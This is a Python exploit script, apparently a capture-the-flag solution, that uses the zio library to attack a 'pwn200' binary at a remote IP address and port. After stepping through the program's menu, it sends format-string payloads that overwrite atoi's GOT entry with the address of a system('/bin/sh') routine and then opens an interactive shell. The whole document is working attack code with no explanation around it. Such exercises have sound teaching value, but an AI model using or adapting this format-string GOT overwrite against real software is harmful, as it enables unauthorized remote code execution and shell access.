from zio import *

target = ('58.213.63.30',50021)
#target = './pwn200'
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "red")
io = zio(target,print_read=r_m,print_write=w_m)

get_shell_addr = 0x804a08b
atoi_got   = 0x0804B16C
#---- intger overflow ----#
io.read_until('name:\n')
io.writeline('muhe')

io.read_until('Exit\n')
io.writeline('2')

#---- win ----#
io.read_until('Protego')
io.writeline('2')
io.read_until('Protego')
io.writeline('2')
#raw_input('%')
io.read_until('Protego')
io.writeline('2')

#---- fmt ----#

#raw_input('$')	

pl1 = "%134525292c%4$n"   # atio@got
pl2 = "%134520971c%12$n"  # system('/bin/sh') addr
io.writeline(pl1)
io.writeline(pl2)

io.read_until('Exit\n')
io.writeline('getshell')

io.interact()